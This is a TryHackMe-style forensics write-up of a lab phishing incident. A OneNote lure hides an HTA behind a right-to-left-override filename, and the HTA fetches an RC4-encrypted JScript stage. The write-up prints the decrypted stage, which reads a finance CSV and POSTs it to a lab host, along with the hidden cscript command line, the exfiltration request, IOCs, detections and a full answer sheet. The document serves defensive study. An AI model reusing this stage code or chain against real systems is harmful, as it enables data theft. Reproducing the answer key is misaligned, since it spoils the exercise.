# TryHackMe: The Waiting Room — Forensics Writeup

| | |
|---|---|
| **Room** | The Waiting Room |
| **Category** | Strange & Unusual Activity / Forensics |
| **Difficulty** | Medium |
| **Focus** | Attachment forensics, malware analysis (static), network forensics, Windows/Sysmon log analysis |
| **Evidence** | `vendor.eml`, `Sysmon-incident.evtx`, `incident.pcap` |
| **Victim** | Michelle Smith (`MERIDIAN\m.smith`) |

---

## 1. Executive Summary

A user on workstation `MERIDIAN` received a supplier-themed email ("October stationery order / PO-1048") carrying a OneNote file, `Remittance.one`. The OneNote file embeds six objects. Five are harmless decoys (images, a PDF, a CSV). One is an **HTML Application (`.hta`)** whose displayed name was disguised with a **Right-to-Left Override (U+202E)** so that `Remittance_<RLO>fdp.hta` renders as `Remittance_ath.pdf`.

After the user extracted and opened the HTA, the following chain executed:

1. `mshta.exe` ran the HTA.
2. The HTA downloaded an **RC4-encrypted JScript stage** disguised as `remittance-v2.png` from `portal.meridian.thm:8080`.
3. It decrypted the stage with a hard-coded 16-byte key and wrote it to `%LOCALAPPDATA%\Meridian\receipt.js`.
4. `cscript.exe` executed the stage.
5. The stage read `Documents\Finance\payment-register.csv`, RC4-encrypted it with the same key, base64-encoded it, and POSTed it as JSON to `/api/receipt`.

The server accepted the upload (`{"accepted":true,"reference":"MR-6106-028"}`). The data that left the workstation was a payment register containing invoice numbers, vendor names, due dates, amounts and **bank account numbers (IBANs)**. This is a clear business-email-compromise (BEC) enabling data theft.

All analysis was **static**. Nothing was executed.

---

## 2. Tooling and Methodology

| Purpose | Tooling used |
|---|---|
| Email parsing / MIME extraction | Python `email` library |
| OneNote embedded-object carving | Python (carving on the `FileDataStoreObject` GUID `{BDE316E7-2665-4511-A4C4-8D4D0B7A9EAC}`) |
| Windows event parsing | `python-evtx` (alternatives: EvtxECmd, Chainsaw, Hayabusa) |
| PCAP analysis & TCP reassembly | Scapy (alternatives: Wireshark, tshark, NetworkMiner) |
| Decryption / hashing | Python (`hashlib`, custom RC4) (alternative: CyberChef) |

Approach: **email → attachment → host telemetry → network telemetry → correlate → recover exfiltrated data.** Every conclusion below is tied back to at least two independent evidence sources where possible.

---

## 3. Step 1: Identify the Attachment (Email Analysis)

`vendor.eml` headers:

| Header | Value |
|---|---|
| From | `Luke Sullivan <accounts@meridian.thm>` |
| To | `Michelle Smith <m.smith@westbrook.thm>` |
| Subject | `October stationery order / PO-1048` |
| Date | Tue, 06 Oct 2026 17:40:07 -0000 |
| Attachment | `Remittance.one` (`application/onenote`, 22,096 bytes) |

Observations:

- The sender domain (`meridian.thm`) and recipient domain (`westbrook.thm`) differ, consistent with an external "supplier".
- The `Received` header shows the message originated from `127.0.0.1` via a "portal", which is not a normal supplier mail flow.
- The **OneNote** format is a well-known malware delivery container since Microsoft blocked macros by default. Users can double-click embedded objects directly inside a notebook page.

SHA-256 of the outer `Remittance.one` wrapper (not the answer to Q1, but useful as an IOC):

```
393d80fb5a56484ccb615c8fc70c5f3009457b62a281788b5dfa79c209ec8669
```

### Carving the embedded files

OneNote stores embedded files as `FileDataStoreObject` structures preceded by a fixed GUID. Carving on that GUID and reading the 8-byte little-endian length that follows yielded six objects:

| Offset | Size (bytes) | Type | SHA-256 |
|---|---|---|---|
| 11720 | 239 | PNG | `f3148b2c…bd636c` |
| **12432** | **1866** | **HTML (HTA)** | **`e3e53f2e21df0b56eeb62d50146c4d69eb8cbc1bab5b8ba13f8ba5859870f6b3`** |
| 14464 | 1074 | PNG | `c9d2429b…db3f5b3` |
| 15648 | 767 | PNG | `65063c38…f787111a5bb` |
| 16472 | 2419 | PDF (`Invoice-MR-6106-028.pdf`) | `780ea1e3…a3c8b6455` |
| 19008 | 100 | CSV (`Delivery-summary.csv`) | `8bb76a49…a51bc07` |

Page metadata strings in the `.one` file reveal the original file names:

- `Delivery-summary.csv`
- `Invoice-MR-6106-028.pdf`
- `Remittance_<U+202E>fdp.hta` ← the odd one out

The PDF, CSV and PNGs are decoys that make the page look like a legitimate remittance advice. The HTA is the active payload.

### ✅ Question 1: SHA-256 of the embedded attachment that initiated the suspicious activity

```
e3e53f2e21df0b56eeb62d50146c4d69eb8cbc1bab5b8ba13f8ba5859870f6b3
```

> **Tip:** The hash is of the extracted embedded HTA, not of `Remittance.one`.

---

## 4. Step 2: Filename Disguise (Unicode Trick)

The embedded name is stored as `Remittance_` + `U+202E` + `fdp.hta`.

`U+202E` is **RIGHT-TO-LEFT OVERRIDE (RLO)**. It makes the rendering engine display the characters that follow in reverse order, so the user sees:

```
Remittance_ath.pdf   (displayed)
Remittance_<RLO>fdp.hta   (actual)
```

The real extension is `.hta`, but the user sees something that appears to end in `.pdf`. Sysmon confirms the character is present on disk. The `TargetFilename` and `mshta.exe` command line both contain `&#8238;` (decimal for U+202E, XML-escaped in the event data).

**MITRE ATT&CK:** T1036.002 (Masquerading: Right-to-Left Override).

### ✅ Question 2: Unicode code point used to disguise the filename

```
U+202E
```

---

## 5. Step 3: Static Analysis of the HTA

The HTA is small and uses basic string obfuscation:

- Strings are stored as hex in an `entries` array.
- A `value(i)` helper decodes each by **XOR with 0x39**.
- A `transform()` function is a textbook **RC4** implementation (KSA + PRGA).
- `window.onload` calls `loadReceipt()`. The `<hta:application>` tag uses `windowstate="minimize"` and `showintaskbar="no"` to hide the UI. The visible body just says "Preparing the remittance advice...".

### Decoded string table (XOR 0x39)

| Index | Decoded value | Purpose |
|---|---|---|
| 0 | `MSXML2.XMLHTTP.6.0` | HTTP client COM object |
| 1 | `Scripting.FileSystemObject` | File I/O |
| 2 | `WScript.Shell` | Process execution |
| 3 | `http://portal.meridian.thm:8080/assets/remittance-v2.png` | **Stage URL** |
| 4 | `%LOCALAPPDATA%` | Drop location |
| 5 | `\Meridian` | Drop folder |
| 6 | `\receipt.js` | Dropped filename |
| 7 | `GET` | HTTP method |
| 8 | `cscript.exe //B //Nologo ` | Interpreter and flags (batch, no banner) |
| 9 | `3c7a8c88466f5b869bea15f333e3be01` | **RC4 key (hex)** |
| 10 | `MR-6106-028` | Argument passed to the script (campaign/invoice reference) |

### Logic flow of `loadReceipt()`

1. `GET http://portal.meridian.thm:8080/assets/remittance-v2.png`. It exits silently if the status is not 200.
2. Convert the response body to a byte array.
3. Parse the hex key into 16 bytes and RC4-decrypt the response.
4. Create `%LOCALAPPDATA%\Meridian\` if missing.
5. Write `receipt.js` with `var cacheToken="<hex key>";` prepended to the decrypted JScript. This is how the second stage obtains its own key.
6. `WScript.Shell.Run('cscript.exe //B //Nologo "<path>\receipt.js" MR-6106-028', 0, true)` runs it hidden and waits for it to finish.
7. `window.close()`

**MITRE ATT&CK:** T1204.002 (User Execution: Malicious File), T1218.005 (System Binary Proxy Execution: Mshta), T1105 (Ingress Tool Transfer), T1027 (Obfuscated Files or Information), T1059.007 (JavaScript/JScript).

---

## 6. Step 4: Execution Chain (Sysmon Analysis)

### Timeline (UTC, from `Sysmon-incident.evtx` and the PCAP)

| Time | Event ID | Event |
|---|---|---|
| 17:40:57 | 1 | Thunderbird (PID 6024) opens `Documents\October stationery.eml`. This is the first user-driven step. |
| 17:41:35 | 1 | `ONENOTE.EXE` (PID 4108) launched by `explorer.exe`, opening `...\Temp\pid-6024\Remittance.one` (Thunderbird's temp attachment copy). |
| 17:46:05–06 | 11 | `ONENOTE.EXE` (PID 5792) writes `C:\Users\m.smith\Downloads\PO-1048\Remittance_<RLO>fdp.hta` plus a `:Zone.Identifier` stream (Mark-of-the-Web). The user extracted the embedded file. |
| 17:46:08 | 1 | PowerShell (`-EncodedCommand`) lists `Downloads\PO-1048` and opens it in Explorer. This is part of the lab's user-simulation harness (parent is `VBoxService.exe`). |
| 18:02:28 | 1 | **`mshta.exe` (SysWOW64, PID 4780)** launched by `explorer.exe` on the HTA. The user double-clicked it. |
| 18:02:29 | 11 | `mshta.exe` writes `C:\Users\m.smith\AppData\Local\Meridian\receipt.js` |
| 18:02:29 | 1 | **`cscript.exe` (SysWOW64, PID 1996)**, parent `mshta.exe` (4780), command line `cscript.exe //B //Nologo "...\receipt.js" MR-6106-028` |
| 18:02:59 | 22 / 3 | DNS query for `portal.meridian.thm` and TCP to `10.0.2.2:8080` from PID 4780 (the stage download) |
| 18:03:00 | 22 / 3 | DNS query and TCP to `10.0.2.2:8080` from PID 1996 (the exfiltration POST) |

### Process tree

```
thunderbird.exe (6024)            ← email opened
  └─ [attachment saved to Temp\pid-6024\Remittance.one]
explorer.exe
  └─ ONENOTE.EXE (4108 / 5792)    ← .one opened, HTA extracted to Downloads\PO-1048
explorer.exe (1088)
  └─ mshta.exe (4780)             ← runs Remittance_<RLO>fdp.hta   (T1218.005)
       └─ cscript.exe (1996)      ← runs receipt.js MR-6106-028    (T1059.007)
            └─ HTTP POST → portal.meridian.thm:8080/api/receipt
```

### Analyst notes

- **Distinguishing "contains" from "ran".** The OneNote file contained six objects, but only the HTA was executed. The PDF and CSV never appear in any process-creation event.
- The `Zone.Identifier` stream shows the HTA carried **Mark-of-the-Web**. SmartScreen/AppRep helpers (`CHXSmartScreen.exe`, PID 116) fire around execution, yet the file still ran. Controls here were not blocking.
- Sysmon logs `cscript.exe` under `SysWOW64`, even though the command line says `System32`. This is normal **WOW64 file-system redirection**. `mshta.exe` was also the 32-bit build.
- Network and DNS events for PIDs 4780 and 1996 show `Image: <unknown process>` because the processes had already exited by the time Sysmon resolved the image path. Correlate by **PID and timestamp**, not by image name.
- The `receipt.js` file-write timestamp (18:02:29) is slightly earlier than the logged DNS/TCP timestamps (18:02:59). That ordering is inconsistent with the stage being fetched first. In this lab capture the network-event timestamps appear skewed relative to the file/process events. The PCAP HTTP `Date` headers (18:02:59 / 18:03:00) align with the Sysmon network events, so the relative order of GET then POST is still unambiguous.
- Interpreter nuance: **two** script hosts are in the chain. `mshta.exe` executes the *HTA* (embedded JScript). The *downloaded script* is executed by `cscript.exe`. The question asks about the downloaded script, so the answer is the `cscript.exe` PID.

### ✅ Question 4: Process ID of the interpreter that executed the downloaded script

```
1996
```

> **Common mistake:** `4780` is `mshta.exe`, the parent. It ran the HTA, not the downloaded stage.

---

## 7. Step 5: Network Analysis (PCAP)

The capture contains 476 packets, mostly Windows background noise: DNS to `10.0.2.2` (including `wpad`, `thm.local`, Microsoft telemetry), mDNS, LLMNR, NBNS and IGMP. The relevant traffic is two short TCP conversations from `10.0.2.15` (victim) to `10.0.2.2:8080`.

### DNS

The only suspicious lookup is `portal.meridian.thm`. It matches Sysmon Event ID 22 (`QueryResults: ::ffff:10.0.2.2`).

### Flow 1: stage download

```http
GET /assets/remittance-v2.png HTTP/1.1
Accept: */*
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E)
Host: portal.meridian.thm:8080

HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.12.14
Content-Type: application/octet-stream
Content-Length: 1709
```

Indicators that the "PNG" is not an image:

- The `Content-Type` is `application/octet-stream`, not `image/png`.
- The body contains no PNG magic bytes (`89 50 4E 47`). It is high-entropy ciphertext.
- The server banner `BaseHTTP/0.6 Python/3.12.14` is a hand-rolled Python server, not a CDN or a normal web server.
- The `MSIE 7.0 / Trident/7.0` User-Agent is typical of `mshta.exe` / `MSXML2.XMLHTTP` using the legacy IE engine.

### ✅ Question 3: Hostname that served the downloaded stage

```
portal.meridian.thm
```

> The port (`:8080`) is part of the URL and `Host` header, but the hostname itself is `portal.meridian.thm`. If the platform rejects the answer, make sure you are not including the port or a scheme.

### Decrypting the stage

Using the key recovered from the HTA, RC4-decrypting the 1709-byte body yields clear-text JScript (the stage):

```javascript
var args=WScript.Arguments;
var shell=new ActiveXObject("WScript."+"Shell"),fs=new ActiveXObject("Scripting."+"FileSystemObject");
var source=shell.ExpandEnvironmentStrings("%USERPROFILE%")+"\\Documents\\Finance\\payment-register.csv";
if(args.length!=1||!fs.FileExists(source))WScript.Quit(0);
var h=cacheToken,k=[];for(var n=0;n<h.length;n+=2)k.push(parseInt(h.substr(n,2),16));
var handle=fs.OpenTextFile(source,1,false),content=handle.ReadAll();handle.Close();
var input=[];for(var n=0;n<content.length;n++)input.push(content.charCodeAt(n)&255);
function transform(a,k){ /* RC4 */ }
function b64(a){ /* base64 */ }
function q(s){ /* JSON string escape */ }
var envelope='{"reference":'+q(args.Item(0))+',"workstation":'+q(shell.ExpandEnvironmentStrings("%COMPUTERNAME%"))+',"user":'+q(shell.ExpandEnvironmentStrings("%USERNAME%"))+',"document":'+q(fs.GetFileName(source))+',"data":'+q(b64(transform(input,k)))+'}';
var request=new ActiveXObject("MSXML2."+"XMLHTTP.6.0");
request.open("POST","http://portal.meridian.thm:8080/api/receipt",false);
request.setRequestHeader("Content-Type","application/json");request.send(envelope);
```

What the stage does:

- Exits quietly if the argument is missing or the target file does not exist. The stage is **targeted** at one specific file path.
- Reads `%USERPROFILE%\Documents\Finance\payment-register.csv`.
- Reuses the key from `cacheToken`. The HTA prepended `var cacheToken="<key>";` when writing the file to disk, so the **key is recoverable from `receipt.js` on the endpoint** too.
- RC4-encrypts the file contents, base64-encodes the result, and wraps it in a JSON envelope with the reference, hostname, username and original filename.
- Splits strings (`"WScript."+"Shell"`) to dodge naive string signatures.

**MITRE ATT&CK:** T1005 (Data from Local System), T1560 (Archive Collected Data, encryption stage), T1041 (Exfiltration Over C2 Channel), T1071.001 (Application Layer Protocol: Web), T1132.001 (Standard Encoding, base64).

### Flow 2: exfiltration

```http
POST /api/receipt HTTP/1.1
Content-Type: application/json
Host: portal.meridian.thm:8080
Content-Length: 557

{"reference":"MR-6106-028","workstation":"MERIDIAN","user":"m.smith",
 "document":"payment-register.csv","data":"U3VkU43sl+Cfs0zI/Lzory7LzF..."}

HTTP/1.0 200 OK
Content-Type: application/json

{"accepted":true,"reference":"MR-6106-028"}
```

The server's `accepted: true` response confirms the exfiltration **succeeded**.

---

## 8. Step 6: Recover the Exfiltrated Data

Procedure:

1. Reassemble the TCP stream for the POST request (client port 59176) and extract the JSON body.
2. Base64-decode the `data` field (the first bytes decode to ciphertext that does not start with any recognisable header).
3. RC4-decrypt using the 16-byte key from the HTA.
4. Hash the plaintext.

### ✅ Question 5: Encryption key protecting the transferred document

```
3c7a8c88466f5b869bea15f333e3be01
```

> The key is the hex string stored in the HTA's `entries[9]`. It is parsed as **16 raw bytes** for RC4, not used as an ASCII string.

CyberChef recipe for reproduction: `From Base64` → `RC4 (Passphrase, Hex: 3c7a8c88466f5b869bea15f333e3be01, Input: Latin1, Output: Latin1)` → `SHA2 (256)`.

### Recovered plaintext (`payment-register.csv`, 331 bytes)

```csv
invoice,vendor,due_date,amount,currency,account,status
MR-6106-028,Meridian Office Supplies,2026-10-16,3840.00,GBP,GB29NWBK60161331926819,awaiting_approval
ST-8832,Stonebridge Couriers,2026-10-09,126.40,GBP,GB82WEST12345698765432,scheduled
WR-4407,Westbrook Print,2026-10-12,612.00,GBP,GB29NWBK60161331926819,awaiting_approval
```

### ✅ Question 6: SHA-256 of the document transferred from the workstation

```
c19c4964c2a77872c49750cc1c2dd443b48fba984b41988aec6fbc780faed09a
```

> Hash is computed over the **decrypted** plaintext (331 bytes, CRLF line endings preserved), not the ciphertext or the base64.

### Impact assessment

| Item | Detail |
|---|---|
| Data type | Accounts-payable register: vendor names, invoice references, amounts, due dates, IBANs, approval status |
| Records | 3 invoices, 3 vendors |
| Sensitivity | **High**. This is ideal reconnaissance for invoice-fraud / BEC (knowing which invoices are "awaiting_approval", who the vendors are and their payment details). |
| Observation | Invoice `MR-6106-028` (Meridian Office Supplies, £3,840.00) is the same reference used as the campaign tag throughout the attack, which suggests the attacker is tailoring follow-on fraud around that vendor. |
| Confirmation of loss | Yes. HTTP 200 with `"accepted":true` |

---

## 9. Full Kill Chain Summary

```
[Delivery]   Email "October stationery order / PO-1048" → Remittance.one
[Lure]       OneNote page with decoy PDF/CSV/PNGs + disguised HTA
[Evasion]    U+202E makes "...fdp.hta" display as "...ath.pdf"
[Execution]  User extracts HTA → mshta.exe (PID 4780)
[Staging]    GET /assets/remittance-v2.png → RC4 ciphertext (not a PNG)
[Drop]       %LOCALAPPDATA%\Meridian\receipt.js (+ key as cacheToken)
[Execution]  cscript.exe //B //Nologo receipt.js MR-6106-028 (PID 1996)
[Collection] Documents\Finance\payment-register.csv
[Exfil]      RC4 → base64 → JSON POST /api/receipt → HTTP 200 accepted
```

---

## 10. MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Initial Access | Phishing: Spearphishing Attachment | T1566.001 | `Remittance.one` in `vendor.eml` |
| Execution | User Execution: Malicious File | T1204.002 | User extracted and ran the HTA |
| Execution | Command and Scripting Interpreter: JavaScript | T1059.007 | HTA JScript, `cscript.exe receipt.js` |
| Defense Evasion | Masquerading: Right-to-Left Override | T1036.002 | `Remittance_<U+202E>fdp.hta` |
| Defense Evasion | System Binary Proxy Execution: Mshta | T1218.005 | `mshta.exe` running the HTA |
| Defense Evasion | Obfuscated Files or Information | T1027 | XOR-encoded strings, RC4 stage, string splitting |
| Defense Evasion | Hide Artifacts: Hidden Window | T1564.003 | `//B` batch mode, `Run(..., 0, ...)`, minimised HTA |
| Command and Control | Ingress Tool Transfer | T1105 | Stage disguised as `.png` |
| Collection | Data from Local System | T1005 | `payment-register.csv` |
| Collection | Archive Collected Data (encryption) | T1560 | RC4 + base64 |
| Exfiltration | Exfiltration Over C2 Channel | T1041 | HTTP POST to `/api/receipt` |

---

## 11. Indicators of Compromise (IOCs)

**Files**

| Type | Value |
|---|---|
| SHA-256 (`Remittance.one`) | `393d80fb5a56484ccb615c8fc70c5f3009457b62a281788b5dfa79c209ec8669` |
| SHA-256 (embedded HTA) | `e3e53f2e21df0b56eeb62d50146c4d69eb8cbc1bab5b8ba13f8ba5859870f6b3` |
| SHA-256 (exfiltrated CSV, plaintext) | `c19c4964c2a77872c49750cc1c2dd443b48fba984b41988aec6fbc780faed09a` |
| Filename | `Remittance_<U+202E>fdp.hta` |
| Dropped file | `C:\Users\m.smith\AppData\Local\Meridian\receipt.js` |
| HTA path | `C:\Users\m.smith\Downloads\PO-1048\Remittance_<U+202E>fdp.hta` |

**Network**

| Type | Value |
|---|---|
| Host / URL | `portal.meridian.thm` |
| Stage URL | `http://portal.meridian.thm:8080/assets/remittance-v2.png` |
| Exfil URL | `http://portal.meridian.thm:8080/api/receipt` |
| Destination | `10.0.2.2:8080/tcp` |
| Server banner | `BaseHTTP/0.6 Python/3.12.14` |
| User-Agent | `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; ...)` |

**Cryptographic / behavioural**

| Type | Value |
|---|---|
| RC4 key | `3c7a8c88466f5b869bea15f333e3be01` |
| Campaign reference | `MR-6106-028` |
| Command line | `cscript.exe //B //Nologo "...\Meridian\receipt.js" MR-6106-028` |
| Process lineage | `explorer.exe → mshta.exe → cscript.exe` |

---

## 12. Detection Opportunities

**Sigma-style logic (descriptive)**

1. **Mshta spawning a script host.** Sysmon EID 1 where `ParentImage` ends with `\mshta.exe` and `Image` ends with `\cscript.exe` or `\wscript.exe`. Near-zero false-positive rate.
2. **Script file written to a user profile by `mshta.exe`.** Sysmon EID 11 where the process is `mshta.exe` and `TargetFilename` ends in `.js`, `.vbs` or `.hta` under `AppData`.
3. **RLO character in a path.** Any `Image`, `CommandLine` or `TargetFilename` containing `U+202E` (`\u202e`).
4. **OneNote writing executable content.** Sysmon EID 11 where `Image` is `ONENOTE.EXE` and `TargetFilename` ends in `.hta`, `.js`, `.vbs`, `.wsf`, `.bat`, `.cmd`, `.exe` or `.lnk`.
5. **Network connections from `mshta.exe` / `cscript.exe`.** Sysmon EID 3 / 22 from either binary. Rare in normal enterprise use.
6. **Content-type mismatch.** Proxy or IDS rule for a URL ending in `.png` returning `application/octet-stream` (or lacking PNG magic bytes).
7. **Legacy IE User-Agent** (`MSIE 7.0; Trident/7.0`) from a modern endpoint.
8. **Email gateway.** Block or detonate `.one` attachments from external senders. Flag attachments whose embedded objects include script/HTA types.

---

## 13. Recommendations

**Immediate containment**

- Isolate `MERIDIAN` and disable/reset `m.smith` credentials.
- Block `portal.meridian.thm` and `10.0.2.2:8080` at DNS and the egress proxy.
- Remove `receipt.js` and the HTA. Preserve copies, plus a memory image if feasible, for forensics.
- Search mail logs for other recipients of `accounts@meridian.thm` / the same subject and hash.

**Business-impact response**

- Treat all three vendors' payment details as **exposed**. Alert Finance and require out-of-band verification (phone call to a known number) for any change-of-bank-details request or urgent payment on the listed invoices.
- Notify the vendors and the legal/compliance team. Assess regulatory notification duties for the data involved.

**Hardening**

- Block `.one` attachments at the email gateway, or strip embedded files. Apply Microsoft's guidance to block embedded-file execution in OneNote.
- Disable or restrict `mshta.exe` and `wscript.exe`/`cscript.exe` via WDAC/AppLocker or ASR rules. Disable the Windows Script Host where it is not needed.
- Enforce Mark-of-the-Web handling, and don't allow users to bypass SmartScreen warnings.
- Apply egress filtering and TLS inspection. Alert on non-standard ports (8080) to uncategorised or internal-looking domains.
- Restrict access to the `Documents\Finance` share/folder on a need-to-know basis, and monitor reads of financial files by script hosts.
- User awareness training focused on file-extension spoofing and unexpected "remittance" or "invoice" lures.

---

## 14. Answer Sheet

| # | Question | Answer |
|---|---|---|
| 1 | SHA-256 of the embedded attachment that initiated the suspicious activity | `e3e53f2e21df0b56eeb62d50146c4d69eb8cbc1bab5b8ba13f8ba5859870f6b3` |
| 2 | Unicode code point used to disguise the filename | `U+202E` |
| 3 | Hostname that served the downloaded stage | `portal.meridian.thm` |
| 4 | PID of the interpreter that executed the downloaded script | `1996` |
| 5 | Encryption key protecting the transferred document | `3c7a8c88466f5b869bea15f333e3be01` |
| 6 | SHA-256 of the transferred document | `c19c4964c2a77872c49750cc1c2dd443b48fba984b41988aec6fbc780faed09a` |

---

## 15. Lessons Learned

1. **Container formats are the new macro.** OneNote, ISO, VHD and ZIP wrappers are chosen precisely because they bypass the controls built around Office macros.
2. **Know the difference between what a file contains and what ran.** The `.one` held six objects, but process telemetry proved that only one executed. Always anchor conclusions to execution evidence.
3. **File extensions in a GUI cannot be trusted.** Inspect raw bytes and logs for bidirectional control characters.
4. **Network artefacts lie too.** A `.png` URL returned encrypted JScript. Validate content, not names.
5. **Living-off-the-land binaries (`mshta`, `cscript`) make for high-fidelity detections** when you alert on parent-child relationships rather than on the binaries alone.
6. **Hard-coded keys give defenders the advantage.** Once the key is recovered from the loader, the exfiltrated data can be fully reconstructed, and the real business impact can be stated precisely.
